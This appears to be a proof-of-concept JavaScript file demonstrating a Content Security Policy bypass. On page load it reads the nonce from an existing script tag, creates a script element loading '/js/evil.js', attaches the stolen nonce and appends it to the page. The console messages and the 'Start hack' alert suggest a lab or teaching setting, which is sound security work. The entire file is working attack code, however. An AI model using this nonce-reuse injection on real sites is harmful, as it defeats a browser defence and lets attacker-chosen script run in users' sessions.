window.onload = function(){
    alert('Start hack');
    console.log('Start hack')
    console.log('Sniff script nonce')
    /* sniff script nonce from DOM */
    var scriptNonce = document.getElementsByTagName('script')[0].getAttribute('nonce');
	// var scriptNonce = 'r4nd0m';
    console.log('Sniffed nonce: ' + scriptNonce);

    /* init malicious script */
    var evilScript = document.createElement('script');

    console.log('Create script element that contain the sniffed nonce and insert it on html');
    /* set script attribute */
    evilScript.src = '/js/evil.js';
    evilScript.type = "text/javascript";
    /* insert sniffed nonce */
    evilScript.setAttribute('nonce', scriptNonce);
    /* append malicious script on body */
    document.body.appendChild(evilScript);
    console.log(evilScript);
};
